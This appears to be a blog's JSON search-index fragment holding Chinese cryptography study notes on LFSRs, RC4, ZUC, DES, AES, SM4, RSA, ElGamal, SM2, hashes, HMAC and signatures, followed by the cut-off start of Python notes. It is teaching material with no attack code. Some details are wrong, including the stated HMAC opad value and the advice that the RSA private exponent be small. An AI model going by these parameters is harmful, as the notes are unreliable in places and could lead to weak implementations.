M.R}=\\sum_{i=0}^{25}(p_i-\\frac{1}{26})^2=\\sum_{i=0}^25p_i^2-0.0385$. 明文或单表代换时 ${\\rm M.R}\\approx 0.027$, 更接近 $0$ 则更可能为多表代换.\n重合指数: ${\\rm IC}=\\sum_{i=0}^{25}p_i^2$. 多表代换时 ${\\rm IC}\\approx 0.0655$. 相同字母间隔为 $d_1,\u0026hellip;,d_n$, 则密钥可能长度为 ${\\rm gcd}(d_1,\u0026hellip;,d_n)$.\n自同步序列密码 异或$\\rm XOR$ ($GF(2)$加法) $\\oplus$ 加密: 无条件安全; 可逆. 与同步序列密码相比, 传输产生的错误有界.\n种子密钥通过LFSR(线性反馈移位寄存器)生成伪随机密钥序列 $k=k_0k_1k_2\u0026hellip;$. 加密 $c_i=E_{k}(m)=m_i\\oplus k_i$. 解密 $m_i=D_{k}(m)=c_i\\oplus k_i$. LFSR: 状态 $(s_0,s_1,\u0026hellip;,s_{n-1})$, 递推关系式 $s_{n+k}=\\bigoplus g_is_i$, 反馈函数 $f(s_0,s_1,\u0026hellip;,s_{n-1})=\\sum g_is_i$, 连接多项式(特征多项式) $g(x)=\\sum g_ix_i^i$, $s_i,g_i,x_i\\in GF(2)$.\ne.g. $\\ g(x)=1+x+x^2+x^5$, $s_{5+i}=s_{i}+s_{1+i}+s_{4+i}$. $S_0=(1,0,1,1,1)$, $k=101110111011101110111\u0026hellip;$, $T=8$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 使用verligo实现LFSR. // 32-bit long module lfsr(32)(clk, reset, lfsr); input clk, reset; output reg [31:0] lfsr; wire d0; xnor(d0, lfsr[31], lfsr[21], lfsr[1], lfsr[0]); always @(posedge clk, posedge reset) begin if(reset) begin lfsr \u0026lt;= 32\u0026#39;h00000001; end else begin lfsr \u0026lt;= {lfsr[30:0], d0}; end end endmodule 定理: $n$ 次特征多项式为 $GF(2^n)$ 上本原多项式时, 输出 $\\max T=2^n-1$ 序列($m$ 序列). 将 $x^{2^n-1}-1$ 在 $GF(2^n)$ 上因式分解; 保留次数为 $n$ 且不能在 $GF(2^n)$ 上整除 $x^a-1,n\u0026lt;a\u0026lt;2^n-1$ 的因式.\n截获长度 $l\\geq 2(2^n-1)$ 的明密文对 $(c,m)$, 则 $k=c\\oplus m$, 有状态 $S_i,\u0026hellip;,S_{i+n+1}$; 记 $X=(S_i,\u0026hellip;,S_n)$, $Y=(S_{i+1},\u0026hellip;,S_{i+n+1})$, 有 $Y\\equiv HX({\\rm mod}\\ 2)$. $m$ 序列时, $X$满秩, $H\\equiv YX^{-1}({\\rm mod}\\ 2)$ 为特征多项式的友矩阵.\n$$H=\\left( \\begin{array}{} 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ \u0026hellip; \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 1 \\\\ g_0 \u0026amp; g_1 \u0026amp; g_2 \u0026amp; \u0026hellip; \u0026amp; g_{n-1} \\end{array}\\right )$$\n可引入非线性运算增加复杂性: 与AND($GF(2)$上乘法) $\\otimes$.\nRC4 基于非线性数据表变换. 密钥流产生分为2个阶段: (1) 输入密钥并初始化排列S表; (2) S表不断置换产生密钥流.\n初始化: 线性填充256字节S表, 密钥循环填充T表. $i$ 遍历 $0-255$, $j=(j+S[i]+T[i])\\%256$, 交换 $S[i]$ 和 $S[j]$.\n产生密钥流: $i$ 循环遍历 $0-255$, $j=(j+S[i])\\%256$, 交换 $S[i]$ 和 $S[j]$, $t=(S[i]+S[j])\\%256$, $k_i=S[t]$.\n安全问题: 存在弱密钥使得初始化置换后 $S$ 表顺序不变; 存在弱密钥使得密钥流在100万字节内完全重复; 密钥较短的容易被攻击, 但长度超过128位的密钥依然有效.\nZUC LTE-4G国际标准, 包含机密性128-EEA3和完整性128-EIA3, 基于LFSR的非线性组合逻辑结构. 分为三层结构: LSFR, Bit重组, 非线性F函数. 符号约定: $\\boxplus$ 为$GF(2^{32})$ 上加法; $|$ 为连接字符串; $_H$ 为高位16位; $_L$ 为低位16位; $\u0026lt; \u0026lt;_o$ 为循环左移.\n输入参数: COUNT 计数器 32bit; BEARER 传载层标识 5bit; DIRECTION 传输方向标志 1bit; CK 密钥 128bit; IBS 输入比特流(明文或密文).\n密钥装入: 128bit扩展为16个31bit, $k=k_0|k_1|\u0026hellip;|k_{15}$, $v=v_0|v_1|\u0026hellip;|v_{15}$; 其中 $iv_0={\\rm COUNT}[0]$, $iv_1={\\rm COUNT}[1]$, $iv_2={\\rm COUNT}[2]$, $iv_3={\\rm COUNT}[3]$, $iv_4={\\rm BEARER}|{\\rm DIRECTION}|00$, $iv_5=iv_6=iv_7=00000000$, $iv_{j+8}=iv_j$, $j=8,9,\u0026hellip;,15$.\nLSFR: 连接多项式为 $GF(2^{31}-1)$ 上本原多项式 $g(x)=x^{16}-2^{15}x^{15}-2^{17}x^{13}-2^{21}x^{10}-2^{20}x^{4}-2^8-1$; 输出 $m$ 序列周期 $T=(2^{31}-1)^{16}-1$; 生成16个31bit LFSR块.\nBit重组: $X_0=S[15]_H|S[14]_L$, $X_1=S[11]_L|S[9]_H$ ,$X_2=S[7]_L|S[5]_H$, $X_3=S[2]_L|S[0]_H$.\n非线性F函数: $W=(X_0\\oplus R_1)\\boxplus R_2$, $W_1=R_1\\boxplus X_1$, $W_2=R_2\\boxplus X_2$, $R_1=S(L_1(W_{1L}|W_{2H}))$, $R_2=S(L_2(W_{2L}|W_{1H}))$; 其中 $L_1(a)=a\\oplus(a\u0026lt; \u0026lt;_o 2)\\oplus(a\u0026lt; \u0026lt;_o 10)\\oplus(a\u0026lt; \u0026lt;_o 18)\\oplus(a\u0026lt; \u0026lt;_o 24)$, $L_2(a)=a\\oplus(a\u0026lt; \u0026lt;_o 8)\\oplus(a\u0026lt; \u0026lt;_o 14)\\oplus(a\u0026lt; \u0026lt;_o 22)\\oplus(a\u0026lt; \u0026lt;_o 30)$; $S$ 盒为 $(S_0,S_1,S_0,S_1)$, 每8bit作为索引, 返回 $S$ 盒中对应的8bit数值.\n密钥流输出: $K=W\\oplus X[3]$, 每个时钟节拍产生32bit密钥流.\n输出参数: OBS 输出比特流(密文或明文).\nZUC生成密钥流分为5个阶段: (1) $ck$ 和 $iv$ 装载到LFSR; (2) 寄存器 $R_1,R_2$ 置空; (3) 初始化模式运行32次; (4) 工作模式运行1次并舍弃输出; (5) 持续工作模式产生密钥流.\n安全问题: 能够抵御多种已知针对序列密码的攻击, 主要威胁是侧信道攻击.\n分组密码 本质为单表代换, 复杂多轮非线性, 通过混淆和扩散实现. 组件: S盒(混淆扩散), P置换(扩散), 轮函数F, 密钥扩展.\n结构模型 S-P网络: 每轮异或密钥后, S盒分组小块混淆扩散, P置换整体扩散, $N_i=F(N_{i-1}\\oplus K_i)$. Feistel网络: 分为左右两部分, $R_i=F(R_{i-1},K_i)\\oplus L_{i-1}$, $L_i=R_{i-1}$, 最后一轮不做对换; 同个算法实现加解密.\n工作模式: ECB(电子密码本): 分组用相同密钥加密; 相同明文产生相同密文; 可并行. CBC(密码分组链接): 初始化 $iv$ 得到第一组密文, 第一组密文与第二组明文异或后再加密; TSL及IPSEc协议推荐; 仅解密支持并行. CFB(密文反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与明文异或后得到密文 $C$, $C$ 高位 $n$ 位填入 $vi$; 流式数据, 错误有界; 仅解密支持并行. OFB(输出反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与高位 $n$ 位填入 $vi$, 密文 $E$ 与明文异或后得到密文 $C$; 流式数据, 错误有界; 不支持并行. CTR(计数器): 自增算子加密后与明文异或得到密文; 相当于一次一密; 简单快速安全可并行. DES 数据加密标准(Data Encryption Standard), 体现Shannon密码设计思想, 公开密码算法先例, 16轮Feistel网络对合加解密.\n密钥扩展: 初始密钥(64bit)经PC1表置换得到 $C_i$ 和 $D_i$ (各28bit), 循环左移 $ls_i$ 位, 经PC2表置换得到第 $i$ 轮子密钥 $K_i$ (48bit); 置换表中元素 $pt_{i}$ 意为将待置换中的第 $pt_{i}$ 位置换到第$i$位.\n初始置换与结束逆置换: 明(密)文(64bit)经IP表置换进入加密, 完成加(解)密后经IPR表置换得到密(明)文(64bit).\n轮函数: 32bit输入经E表置换扩充到48bit, 与子密钥(48bit)异或后, 经S盒压缩回32bit(混淆), 再经P表置换得到32bit输出(扩散); S盒6位输入 $b_1b_2b_3b_4b_5b_6$, 输出$s_{b_1b_6, b_2b_3b_4b_5}$.\nS盒是DES中唯一非线性变换, 设计准则: 改变1bit输入至少2bit发生变化; $S(x)$ 和 $S(x\\oplus 001100)$ 至少2bit发生变化; $S(x)\\neq S(x\\oplus 11ef00)$, $e,f\\in{0,1}$; 改变5bit输入, 输出的0和1数目大致相等; 足够的非线性度以抵抗线性攻击; 差分性均匀以抵抗差分攻击; 足够的代数次数和项目以抵抗插值攻击和高阶差分攻击.\n攻击类型: 穷钥攻击; 侧信道攻击(能量分析, 故障注入分析); 差分攻击; 线性攻击.\n安全问题: 密钥太短(有效仅56bit); 存在弱密钥; 互补对称性(异或运算).\n3-DES: 112(1和3轮密钥相同)/256bit密钥; 加解密速度慢.\nAES 高级数据加密标准(Advanced Encryption Standard), 采用10/12/14轮S-P网络非对合加解密(对应128/192/256bit密钥).\n$GF(2)$ 上多项式域 $GF(2^8)\\cong GF(2)[x]/(x^8+x^4+x^3+x+1)$ 中元素为 $b_{(8)}=b_7x^7+b_6x^6+b_5x^5+b_4x^4+b_3x^3+b_2x^2+b_1x+b_0$, 乘法需对既约多项式 $m(x)=x^8+x^4+x^3+x+1$ 取模, 乘法逆元可由扩展Euclid算法得到. 考虑 $xb_{(8)}=(b_{(8)}\u0026lt; \u0026lt; 1)\\oplus m(x)$, 高次乘法可重复 $x$ 乘实现.\n$GF(2^8)$ 上 $degf\\leq 3$ 多项式环 $GF(2^8)/[x^4+1]$ 中元素为 $b_{(32)}=B_3x^3+B_2x^2+B_1x+B_0$, 乘法需对 $x^4+1$ 取模. 考虑 $xb_{(32)}=b_{(32)}\u0026gt; \u0026gt;8$, 高次乘法可视为 $GF(2^8)$ 上矩阵乘法.\n状态矩阵: 128bit明(密)文和密钥按列优先载入4阶方阵, 每列32bit称为\u0026quot;字\u0026quot;, 加(解)密后按列优先输出密(明)文.\n密钥扩展: 4字输入, 扩展为44字输出; $w[i]=w[i-1]\\oplus w[i-4]$, $i\\% 4 \\ne 0$; $w[i]=w[i-4]\\oplus S(w\u0026rsquo;[i-1])\\oplus Rcon[i]$, $i \\% 4 = 0$, 即每个字循环左移1字节后进行S盒置换.\n轮函数: 主要包括(逆)字节代换, (逆)行位移, (逆)列混合, 轮密钥加(即子密钥异或).\n字节代换即取求每个字节在 $GF(2^8)$ 上的逆后进行仿射变换, 可等效为S盒置换; 逆字节代换即逆仿射变换再取逆, 可等效为逆S盒置换. 行位移即第 $i=0,1,2,3$ 个字循环右移 $i$ 字节; 逆行位移即第 $i$ 个字循环左移 $i$ 字节. 列混合即按列的字在 $GF(2^8)[x^4+1]$ 上与 $a(x)={\\rm 0x03}x^3+{\\rm 0x01}x^2+{\\rm 0x01}x+{\\rm 0x02}$ 相乘; 逆列混合即与 $a^{-1}(x)={\\rm 0x0B}x^3+{\\rm 0x0D}x^2+{\\rm 0x09}x+{\\rm 0x0E}$ 相乘; 均可等效为 $GF(2^8)$ 上的矩阵乘法.\n安全问题: 主要威胁是侧信道攻击.\nSM4 128bit密钥32轮非平衡Feistel网络. 1字$=$4字节$=$32bit.\n密钥扩展: 初始密钥 $(MK_0,MK_1,MK_2,MK_3)$, $K_i=MK_i\\oplus FK_i$ ,$rk_i = K_{i+4} = K_i\\oplus T(K_{i+1}\\oplus K_{i+2}\\oplus K_{i+3}\\oplus CK_i)$; $FK_i$ 为系统参数, $CK_i$ 为固定参数; 以每个字节前4bit作为行, 后4bit作为列, 进行非线性的S盒置换; 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 13)\\oplus (B \u0026lt; \u0026lt;_o 23)$.\n轮函数: $X_{i+4} = X_i\\oplus T\u0026rsquo;(X_{i+1}\\oplus X_{i+2}\\oplus X_{i+3}\\oplus rK_i)$; S盒8位输入 $b_1b_2b_3b_4b_5b_6b_7b_8$ 输出$s_{b_1b_2b_3b_4, b_5b_6b_7b_8}$, 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 2)\\oplus (B \u0026lt; \u0026lt;_o 10)\\oplus (B \u0026lt; \u0026lt;_o 18)\\oplus (B \u0026lt; \u0026lt;_o 24)$.\n反序输出: 输入 $(X_1,X_2,X_3,X_4)$, 输出 $(Y_1,Y_2,Y_3,Y_4)=(X_{35},X_{34},X_{33},X_{32})$.\n安全问题: 主要威胁是侧信道攻击(故障注入分析).\n公钥密码 使用对称加密, $n$ 个实体的网络需要 $\\frac{(n-1)n}{2}$ 个密钥及同等数量的保密信道, 密钥管理困难. 对称加密也难以解决签名和认证问题: 接收方可以伪造原文; 发送方可以否认行为.\n非对称加密基本条件: (1)安全 $k_e\\ne k_d$ 且由 $k_e$ 不能得到 $k_d$; (2) 保密: $D(E(m))=m$; (3)E和D高效; (4) 保真: $E(D(m))=m$.\n单向陷门函数: $y=f(x)$ 满足: (1)给定 $x$, 计算 $y$ 很容易; (2)给定$y$, 不掌握陷门, 计算 $x=f^{-1}(y)$ 很困难; (3)给定$y$, 掌握陷门, 计算 $xf^{-1}(y)$ 很容易.\n数学难题 大合数分解难题: 大素数乘积容易 $p\\times q=n$, 大合数分解困难 $n=p\\times q$. 离散对数难题(DLP): 有限域 $GF(p)$ 上生成元幂乘容易 $a^b=c$, 求对数困难 $\\log_a c=b$. 椭圆曲线离散对数难题(ECDLP): 椭圆曲线群 $E_p(a,b)$ 中基点倍乘容易 $dP=Q$, 求倍数困难 $d=\\frac{Q}{P}$. 误差还原难题(LWE): 有限域 $GF(p)$ 上矩阵乘法加误差容易 $v=As+e$, 解带噪音的线性方程组困难 $s=A^{-1}(v-e)$. 工作方式 发送方 $A$: 先用发送方私钥 $k_{Ad}$ 签名 $s=D(m,k_{Ad})$, 再用接收方公钥 $k_{Be}$ 加密 $c=E(s,k_{Be})$. 接收方 $B$: 先用接收方私钥 $k_{Bd}$ 解密 $s=E(c,k_{Bd})$, 再用发送方公钥 $k_{Ae}$ 验证 $m=D(s,k_{Ae})$. 机密性: 公钥加密, 私钥解密. 真实性: 私钥签名, 公钥验证. RSA RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$. 公钥 $(e,n)$, 加密 $c=E_{e,n}(m)\\equiv m^e({\\rm mod}\\ n)$. 私钥$d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 解密 $m=D_{d,n}(m)\\equiv m^d({\\rm mod}\\ n)$ 证明: $D_{d,n}(E_{e,n}(m))=m$, $E_{e,n}(D_{d,n}(c))=c$.\n即证 $m_{ed}\\equiv m^{(t\\varphi(n))+1} \\equiv m({\\rm mod}\\ n)$.\n${\\rm gcd}(M,n)=1$ 时, 有Euler定理 $m^{\\varphi(m)}\\equiv 1({\\rm mod}\\ n)$.\n${\\rm gcd}(M,n)\\ne 1$ 时, 由于 $m\\leq n$, 不妨设 $m = ap$, $a\\in\\mathbb{Z}$, 有 $m^{\\varphi(q)}\\equiv 1({\\rm mod}\\ q)$, 即 $m^t{\\varphi(n)}=bq+1$, $b\\in\\mathbb{Z}$, 故 $m^t{\\varphi(n)+1} = abn+M$.\n参数选取 $p,q$ 足够大, 一般场景使 $n$ 达到1024bit, 重要场景2048bit. $p,q$ 为强素数, $p-1,p+1,q-1,q+1$ 中均无除 $2$ 外的小因子. $p,q$ 位数不能相差过大或过小. 私钥 $d\\ne e$. ${\\rm gcd}(p-1,q-1)$ 尽可能小, 最好为2; 以避免密文迭代攻击. $e$ 应保证 $m^e\\ll n$; 有人建议为素数 $2^{16}+1=65537$, 二进制表示中仅含两位 $1$, 加密速度较快. $d$ 应较小以保证解密速度, 但确保$d\\ll \\frac{n}{4}$. 多个用户不得共用同一个模 $n$; 以避免共模攻击.\n大素数产生: Miller-Rabin测试.\n加密优化算法: 快速模幂, Montgomery.\n解密优化算法: CRT, 快速模幂, Montgomery.\nMontgomery: $a\\%m=a-k\\times\\lfloor[\\frac{a}{m}]\\rfloor$ 除法运算复杂度较高, 将模乘转换为乘法运算. 记 $a\u0026rsquo;\\equiv aR({\\rm mod}\\ m)$, $b\u0026rsquo;\\equiv bR({\\rm mod}\\ m)$, $R=2^k\u0026gt;m$, $m$ 为奇数, 即 ${\\rm gcd}(R,m)=1$; 此时 $a\u0026rsquo;R^{-1}=a\u0026rsquo;\u0026gt; \u0026gt;k$, $abR\\equiv (a\u0026rsquo;b\u0026rsquo;)R^{-1}({\\rm mod}\\ m)$, $ab\\equiv (abR)^R{-1}({\\rm mod}\\ m)$. $\\exists q$ s.t. $R|a+qm$, 有 $y=\\frac{a+qm}{R}\u0026lt;2m$; 不妨设 $xR-ym=1$, $0\u0026lt;y\u0026lt;R$, $0\u0026lt;x\u0026lt;m$, 有 $q\\equiv ay({\\rm mod}\\ R)$, 其中 $y\\equiv -m^{-1}({\\rm mod}\\ R)$.\nElGamal型 D-H协议: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq x,y\\leq p-2$. 公钥 $(p,g)$, 私钥 $x,y$. 握手: $k_{X\\to Y}\\equiv g^x({\\rm mod}\\ p)$, $k_{Y\\to X}\\equiv g^y({\\rm mod}\\ p)$. 密钥: $k\\equiv k_{Y\\to X}^x\\equiv k_{X\\to Y}^y \\equiv g^{xy}({\\rm mod}\\ p)$. ECDH: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq a,b\\leq q-2$. 公钥 $(p,G)$, 私钥 $x,y$. 握手: $k_{A\\to B}=aG$, $k_{B\\to A}=bG$. 密钥: $k=ak_{B\\to A}=bk_{A\\to B}=(ab)G$.\nElGamal: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq a\\leq p-2$, $Y_a\\equiv g^a({\\rm mod}\\ p)$. 公钥 $(p,g,Y_a)$, 加密 $u\\equiv g^k({\\rm mod}\\ p)$, $v\\equiv mY_a^k({\\rm mod}\\ p)$, $c=E_{p,g,Y_a,k}(m)=(u,v)$, 任选 $2\\leq k\\leq p-2$, $k\\ne a$. 私钥 $a$, 解密 $m\\equiv D_a(c)\\equiv \\frac{v}{u^a}({\\rm mod}\\ p)$. 参数选取: $p$ 足够大, 一般场景512bit, 重要场景1024bit.\nECEG: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq d\\leq q-2$, $P=dG$. 公钥 $(P,G,E,q)$, 加密 $C_1=rG$, $C_2=M+rP$, $c=E_{E_p,P,G,r}(M)=\\{C_1,C_2\\}$, 任选 $2\\leq r\\leq q-2$, $r\\ne d$. 私钥 $d$, 解密 $M=D_{E_p,d}(C)=C_2-dC_1$. 参数选取: $p$ 足够大, 一般为160bit; 余因子 $h=\\frac{|E_p|}{|G|}\\leq 4$; 避免选用超奇异和反常椭圆曲线.\nSM2 SM2本质为ECEG.\n初始化: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq d\\leq q-2$, $P=dG$, $h=\\frac{|E_p|}{|G|}\\leq 4$. 避免选取非超奇异和反常椭圆曲线, $p$ 达到 160bit, $h\\leq 4$, $S=hP\\neq O$. 公钥 $(P,G,E,q)$, 私钥 $d$. 加密: 生成 $2\\leq r\\leq q-1$, $r\\ne d$, $(x_1,y_1)=rG$, $(x_2,y_2)=rP$, $t=k(x_2 || y_2)$. 密钥派生函数 $k$: 32bit计数器 ${\\rm ct}={\\rm 0x01}$, 得到 $\\lfloor\\frac{{\\rm len}}{v}\\rfloor$ 个hash值 $h=H(x_2 || y_2 || {\\rm ct})$, 并截断为 ${\\rm len}$; 其中 ${\\rm len}$ 为 $m$ 长度, $v$ 为hash值长度, 一般采用SM3. $C_1=x_1 || y_1$, $C_2=m\\oplus t$, $C_3=h(x_2 || m || y_2)$, $c=C_1 || C_2 || C_3$\n解密: $(x_2,y_2)=dC_1$, $t=k(x_2 || y_2)$, $m=C_2\\oplus t$; $u=H(x_2 || m || y_2)$, 验证 $u=C_3$.\nHash函数 Hash/杂凑/散列: 将任意长度消息变为固定长度的信息摘要/数字指纹/Hash值/杂凑值/散列值, 记 $h=H(m)$.\n单向性(抗原像攻击): 给定 $h$, 找到 $m\u0026rsquo;$ 有 $h(m\u0026rsquo;)=h$ 在计算上不可行. 抗弱碰撞性(抗第二原像攻击): 给定 $m$, 找到另一 $m\u0026rsquo;$ 有 $H(m)=H(m\u0026rsquo;)$ 在计算上不可行. 抗强碰撞性: 找到一对 $(m,m\u0026rsquo;)$ 有 $H(m)=H(m\u0026rsquo;)$ 在计算上不可行. 随机性: 输出具有伪随机性. 有效性: 运算高效. 错误检测: 输入发生很小变化都会使得输出很大不同.\n应用: 完整性保护; 消息认证码(MAC); 辅助公钥加密, 数字签名, 密钥交换.\n消息填充: 加密分组为 $l$ bit, 最后 $m$ bit 存放消息长度, 将原消息填充到 $s$ bit, 有 $l|s+m$. 迭代型结构(Merkle-Damgard): 每轮 $l$ bit和上一轮输出一同加密得到下一轮输出.\nMD5 Message-Digest Algorithm(消息摘要算法).\n消息填充后(长度以小端序存储), 以512bit分组, 每轮对4个寄存器各1word(32bit)进行16轮迭代, 最后得到128bit输出.\nSHA-256 Secure Hash Algorithm(安全Hash算法).\n消息填充后(长度以大端序存储), 以512bit分组, 每组扩展为64word(2048bit), 每轮对8个寄存器各1word(32bit)进行64轮迭代, 最后得到256bit(8word)输出.\nSM3 消息填充后(长度以大端序存储), 以512bit分组, 每组扩展为132word(4224bit), 每轮对8个寄存器各1word(32bit)进行64轮迭代, 最后得到256bit(8word)输出.\nHMAC Message Authentication Code(消息认证码/密码校验和): 验证消息真实性 共享密钥 $k$, 发送方发送 $({\\rm MAC}=C_k(m),m)$, 接收方比较 $C_k(m\u0026rsquo;)={\\rm MAC}\u0026rsquo;$.\nHMAC: 基于Hash函数的MAC. ${\\rm HMAC}_k=H[(k^+\\oplus {\\rm opad}) || H[(k^+\\oplus {\\rm ipad}) || M]]$ Hash分组大小为 $l$ bit$: k^+$ 为左侧填充0至 $l$ bit; ${\\rm opad}$ 为 01011010 循环填充到 $l$ bit; ${\\rm ipad}$ 为 00110110 循环填充到 $l$ bit.\n数字签名 数字签名: 验证消息真实性和身份合法性. 特点: 签名与文件绑定; 不可抵赖性; 不可伪造性; 第三方可验证性. 发送方签名 $\\delta={\\rm sgn}(m,k_d)$, 接收方比较 ${\\rm vrf}(m\u0026rsquo;,k_e)=\\delta\u0026rsquo;$.\nRSA签名 RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$. 私钥 $d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 签名 $\\delta={\\rm sgn}(m,d)\\equiv m^d({\\rm mod}\\ n)$. 公钥 $e$, 验证 $m\u0026rsquo;={\\rm vrf}(m\u0026rsquo;,e)\\equiv \\delta^e({\\rm mod}\\ n)$. 安全性: 依赖于大整数因子分解 共模伪造: $\\delta_1\\equiv m_1^d({\\rm mod}\\ n)$, $\\delta_2\\equiv m_2^d({\\rm mod}\\ n)$, 可得 $\\delta_1\\delta_2\\equiv (m_1m_2)^d({\\rm mod}\\ n)$. 中间人攻击: 加密信息 $c\\equiv m^e({\\rm mod}\\ n)$, 伪造信息 $c\u0026rsquo;\\equiv r^em^e({\\rm mod}\\ n)$, 签名 $(c\u0026rsquo;)^d\\equiv rm({\\rm mod}\\ n)$, 造成 $m$ 泄漏. 一般不对消息直接签名, 而对消息的hash值签名; 加密密钥对和签名密钥对分离; 先签名再加密.\n现实: 加密 RSA-OAEP; 签名 RSA-PSS/PLCS.\nElGamal型签名 ElGamal: 大素数 $p$, 有循环群 $F_p^*=\\langle g\\rangle$. 私钥 $2\\leq x\\leq p-2$, 签名 $(m,\\delta=(r,s))$, 其中 $r\\equiv g^k({\\rm mod}\\ p)$, $s\\equiv k^{-1}(m-rx)({\\rm mod}\\ p-1)$, 选取 $2\\leq k\\leq p-2$ 且 ${\\rm gcd}(k,p-1)=1$. 公钥 $y\\equiv g^x({\\rm mod}\\ p)$, 验证 $g^m\\equiv r^sy^r({\\rm mod}\\ p)$. 安全性: 依赖于(EC)DLP $k$ 一次性, 否则联立 $\\delta_1 \\equiv k^{-1}(m_1-rx)({\\rm mod}\\ p-1)$ 和 $\\delta_1 \\equiv k^{-1}(m_2-rx)({\\rm mod}\\ p-1)$, 造成私钥 $x$ 泄漏.\nDSA: 大素数 $p$ 且大素因子 $q|p-1$, $q$ 至少160bit, 生成元 $g\\equiv h^{\\frac{p-1}{q}}({\\rm mod}\\ p)\u0026gt;1$, 即 $|g|=q$. 私钥 $2\\leq x\\leq p-2$, 签名 $(m,\\delat=(r,s))$, 其中 $r\\equiv (g^k({\\rm mod}\\ p))({\\rm mod}\\ q)$, $s=k^{-1}(H(m)+rx)({\\rm mod}\\ q)$, 选取 $2\\leq k\\leq q-2$. 公钥 $y=g^x({\\rm mod}\\ p)$, 验证 $r\\equiv g^uy^v({\\rm mod}\\ q)$, 其中 $u\\equiv H(m)s^{-1}({\\rm mod}\\ q)$, $v\\equiv rs^{-1}({\\rm mod}\\ q)$.\nECDSA: 椭圆曲线群 $E_p(a,b)$, 基点 $|G|=n$, 余因子 $h=\\frac{|E_p|}{p}$. 私钥 $2\\leq d\\leq n-2$, 签名 $(m,\\delta=(r,s))$, 其中 $kG=(x_1,y_1)$, $r\\equiv x_1({\\rm mod}\\ n)$, $s\\equiv k^{-1}(H(m)+rd)({\\rm mod}\\ n)$, 选取 $2\\leq k\\leq n-2$. 公钥 $P=dG$, 验证 $r\\equiv x_2({\\rm mod}\\ n)$, 其中 $u\\equiv H(m)s^{-1}({\\rm mod}\\ n)$, $v\\equiv rs^{-1}({\\rm mod}\\ n)$, $uG+vP=(x_2,y_2)$.\nSM2签名 在SM2加密算法的基础上, 本质为ECEG.\n初始化: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq d\\leq q-2$, $P=dG$, $h=\\frac{|E_p|}{|G|}\\leq 4$. 选取非超奇异和反常椭圆曲线, $p$ 达到 160bit, $h\\leq 4$, $S=hP\\neq O$. 公钥 $(P,G,E,q)$, 私钥 $d$. 签名: $(m,\\delta=(r,s))$, 其中 $kG=(x_1,y_1)$, $r\\equiv H(Z||M)+x_1({\\rm mod}\\ q)$ 且 $r\\ne 0$ 及 $r+k\\ne q$, $s\\equiv (1+d)^{-1}(k-rd)({\\rm mod}\\ q)$ 且 $s\\ne 0$, 选取 $2\\leq k\\leq q-2$.\n验证: $r+s\\not\\equiv 0({\\rm mod}\\ q)$ 且 $r\\equiv x_2({\\rm mod}\\ q)$, 其中 $sG+(r+s)P=(x_2, y_2)$.\n身份认证 口令 安全问题: 弱口令易被暴力破解和字典攻击; 口令明文传输和明文保存易导致泄漏. 解决办法: 口令加盐Hash存储; 通过TSL传输.\n挑战-应答 实现方案: 数字签名. 安全问题: 依赖于密钥管理; 需确保用户公钥的真实性和完整性以避免中间人攻击.\nZKP(零知识证明): 使验证者(V)确信证明者(P)能够证明某一信息, 但无法获得其他任何信息.\n基于DLP的认证协议: P向V证明知道私钥 $x$, 而不泄露 $x$; $p$ 为大素数, 公钥 $y\\equiv g^x({\\rm mod}\\ p)$. 承诺: P随机选取 $2\\leq k\\leq p-2$ 并发送 $r\\equiv g^k({\\rm mod}\\ p)$. 挑战: V随机发送 $b\\in{0,1}$. 应答: P发送 ${\\rm sgn}\\equiv k+bx({\\rm mod}\\ p-1)$. 验证: V验证 $g^s\\equiv ry^b({\\rm mod}\\ p)$. 重复 $t$ 次, P欺骗成功概率为 $\\frac{1}{2^t}$.\nSchnorr协议: P向V证明知道私钥 $x$, 而不泄露 $x$; $p$ 为大素数, 大素数 $q|p-q$, $g$ 为模 $q$ 原根, 公钥 $y\\equiv g^x({\\rm mod}\\ p)$. 承诺: P随机选取 $2\\leq k\\leq q-2$ 并发送 $r\\equiv g^k({\\rm mod}\\ p)$. 挑战: V随机发送 $1\\leq e\\leq 2^t\u0026lt;q$. 应答: P发送 $s\\equiv k-ex({\\rm mod}\\ q)$. 验证: V验证 $r\\equiv g^sy^e({\\rm mod}\\ p)$. 无需重复, P欺骗成功概率为 $\\frac{1}{2^t}$.\n","date":"2023-11-02T00:00:00Z","permalink":"https://example.com/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E5%BC%95/","title":"密码学导引"},{"content":" (3.9) 运算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 # 除法自动转换为浮点数 35 / 5 # =\u0026gt; 7.0 # 向下取整除法 3 // -5 # =\u0026gt; -1 -5.0 // 3.0 # =\u0026gt; -2.0 # 取模正负与模数相同 -7 % 3 # =\u0026gt; 2 7 % -3 # =\u0026gt; -2 # 乘方 2 ** 4 # =\u0026gt; 16 # 逻辑运算符 True and 0 # =\u0026gt; False not -5 or False # =\u0026gt; True # 大小比较相连 1 \u0026lt; 3 \u0026lt; 2 # =\u0026gt; False 1 